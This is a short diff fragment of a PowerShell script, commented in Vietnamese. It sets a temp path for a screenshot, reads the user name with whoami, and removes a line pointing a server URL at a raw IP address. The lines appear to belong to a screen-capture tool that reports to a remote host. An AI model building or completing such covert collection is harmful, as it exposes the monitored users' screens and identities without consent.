@@ -1,6 +1,6 @@
 # Đường dẫn lưu ảnh chụp màn hình
 $tempScreenshot = "$env:TEMP\screenshot.png"
-$ServerUrl = "http://157.245.57.163:1339"
+
 # Lấy tên máy
 $name = whoami
 
